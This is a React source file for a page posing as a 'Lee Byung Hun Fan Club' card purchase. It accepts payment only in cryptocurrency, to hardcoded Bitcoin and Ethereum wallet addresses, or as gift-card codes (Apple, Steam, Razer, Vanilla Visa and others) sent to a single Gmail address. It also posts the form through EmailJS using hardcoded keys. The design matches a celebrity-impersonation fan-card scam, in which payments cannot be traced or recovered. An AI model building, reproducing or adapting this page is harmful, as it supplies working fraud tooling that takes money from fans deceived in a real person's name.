import React, { useState, useEffect, useRef } from 'react';
import leeImage from '../assets/lee7.jpg';
import ScrollReveal from 'scrollreveal';
import emailjs from 'emailjs-com';
import {
  FaBitcoin,
  FaEthereum,
  FaCcVisa,
  FaApple,
  FaCcAmex,
  FaSteam,
  FaGamepad,
} from 'react-icons/fa';

const CardPage = () => {
  const [selectedMethod, setSelectedMethod] = useState('');
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [selectedGiftCard, setSelectedGiftCard] = useState('');
  const [showPaymentMessage, setShowPaymentMessage] = useState(false);
  const formRef = useRef();

  const cryptoAddresses = {
    bitcoin: 'bc1qwagy854zy85lcavfhttk025f0h9gtqqpnhk23r',
    usdt: '0x3c7fEe11C0814A508F3E52139Cb99703549C1c31',
    ethereum: '0x3c7fEe11C0814A508F3E52139Cb99703549C1c31',
  };

  const giftCardEmails = {
    razer: 'byunghunentertainment@gmail.com',
    apple: 'byunghunentertainment@gmail.com',
    vanilla: 'byunghunentertainment@gmail.com',
    amex: 'byunghunentertainment@gmail.com',
    sephora: 'byunghunentertainment@gmail.com',
    steam: 'byunghunentertainment@gmail.com',
  };

  const handleChange = (e) => {
    setSelectedMethod(e.target.value);
    setSelectedCrypto('');
    setSelectedGiftCard('');
  };

  const handleCryptoChange = (e) => setSelectedCrypto(e.target.value);
  const handleGiftCardChange = (e) => setSelectedGiftCard(e.target.value);

  const sendEmail = (e) => {
    e.preventDefault();
    emailjs.sendForm(
      'service_0kmdxhr',
      'template_rhvzeor',
      formRef.current,
      'HzqW2sUdz2C1efEVk'
    ).then(() => {
      setShowPaymentMessage(true);
      setSelectedMethod('');
      setSelectedCrypto('');
      setSelectedGiftCard('');
      formRef.current.reset();
    }).catch(console.error);
  };

  useEffect(() => {
    ScrollReveal().reveal('.reveal', {
      delay: 200,
      distance: '50px',
      duration: 800,
      easing: 'ease-in-out',
      origin: 'bottom',
    });
  }, []);

  return (
    <section className="reveal p-6 max-w-2xl rounded-lg mx-auto shadow-md">
      <div className="mb-6">
        <img
          src={leeImage}
          alt="Lee Byung Hun Fan Club"
          className="w-full max-h-[500px] object-cover rounded-lg shadow-md"
        />
      </div>

      <h2 className="text-2xl font-bold mb-4">Choose Payment Method</h2>

      <form ref={formRef} onSubmit={sendEmail}>
        {/* Payment Method */}
        <div className="mb-4">
          <label className="block mb-2 font-semibold">Select a payment option:</label>
          <div className="space-y-2">
            <label className="flex items-center gap-2">
              <input
                type="radio"
                name="payment_option"
                value="crypto"
                checked={selectedMethod === 'crypto'}
                onChange={handleChange}
              />
              Crypto
            </label>
            <label className="flex items-center gap-2">
              <input
                type="radio"
                name="payment_option"
                value="giftcard"
                checked={selectedMethod === 'giftcard'}
                onChange={handleChange}
              />
              Gift Card
            </label>
          </div>
        </div>

        {/* Crypto Radios */}
        {selectedMethod === 'crypto' && (
          <div className="p-4 rounded-md mt-4 bg-black text-white">
            <h3 className="text-lg font-semibold mb-2">Choose a Crypto Option:</h3>
            <div className="space-y-2 mb-4">
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="crypto_type"
                  value="bitcoin"
                  checked={selectedCrypto === 'bitcoin'}
                  onChange={handleCryptoChange}
                />
                <FaBitcoin className="text-yellow-500" />
                Bitcoin
              </label>
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="crypto_type"
                  value="usdt"
                  checked={selectedCrypto === 'usdt'}
                  onChange={handleCryptoChange}
                />
                <FaEthereum className="text-green-400" />
                USDT (ETH)
              </label>
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="crypto_type"
                  value="ethereum"
                  checked={selectedCrypto === 'ethereum'}
                  onChange={handleCryptoChange}
                />
                <FaEthereum className="text-blue-400" />
                Ethereum
              </label>
            </div>

            {selectedCrypto && (
              <p className="text-blue-400 font-mono text-sm break-words">
                {cryptoAddresses[selectedCrypto]}
              </p>
            )}
          </div>
        )}

        {/* Gift Card Radios */}
        {selectedMethod === 'giftcard' && (
          <div className="p-4 rounded-md mt-4 bg-black text-white">
            <h3 className="text-lg font-semibold mb-2">Select Gift Card Type:</h3>
            <div className="space-y-2 mb-4">
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="giftcard_type"
                  value="razer"
                  checked={selectedGiftCard === 'razer'}
                  onChange={handleGiftCardChange}
                />
                <FaGamepad />
                Razer Gold
              </label>
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="giftcard_type"
                  value="apple"
                  checked={selectedGiftCard === 'apple'}
                  onChange={handleGiftCardChange}
                />
                <FaApple />
                Apple
              </label>
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="giftcard_type"
                  value="vanilla"
                  checked={selectedGiftCard === 'vanilla'}
                  onChange={handleGiftCardChange}
                />
                <FaCcVisa />
                Vanilla Visa
              </label>
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="giftcard_type"
                  value="amex"
                  checked={selectedGiftCard === 'amex'}
                  onChange={handleGiftCardChange}
                />
                <FaCcAmex />
                American Express
              </label>
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="giftcard_type"
                  value="sephora"
                  checked={selectedGiftCard === 'sephora'}
                  onChange={handleGiftCardChange}
                />
                💄
                Sephora
              </label>
              <label className="flex items-center gap-3">
                <input
                  type="radio"
                  name="giftcard_type"
                  value="steam"
                  checked={selectedGiftCard === 'steam'}
                  onChange={handleGiftCardChange}
                />
                <FaSteam />
                Steam
              </label>
            </div>

            {selectedGiftCard && (
              <div>
                <p className="text-sm">Send code and amount to:</p>
                <p className="text-blue-400 font-semibold">
                  {giftCardEmails[selectedGiftCard]}
                </p>
              </div>
            )}
          </div>
        )}

        {/* Submit Button */}
        <div className="flex justify-center mt-6">
          <button
            type="submit"
            className="w-60 p-4 rounded-full bg-blue-600 hover:bg-blue-700 text-white font-semibold transition duration-200"
          >
            Proceed
          </button>
        </div>
      </form>

      {/* Confirmation */}
      {showPaymentMessage && (
        <div className="fixed top-0 left-0 right-0 bottom-0 bg-white bg-opacity-80 flex flex-col items-center justify-center text-white text-xl font-semibold p-6 lg:p-8">
          <p className="border rounded-3xl bg-black p-3 text-center">
            Kindly send the proof of your payment to
          </p>
          <b className="border rounded-xl bg-black p-4 text-blue-500">
            byunghunentertainment@gmail.com
          </b>
        </div>
      )}
    </section>
  );
};

export default CardPage;
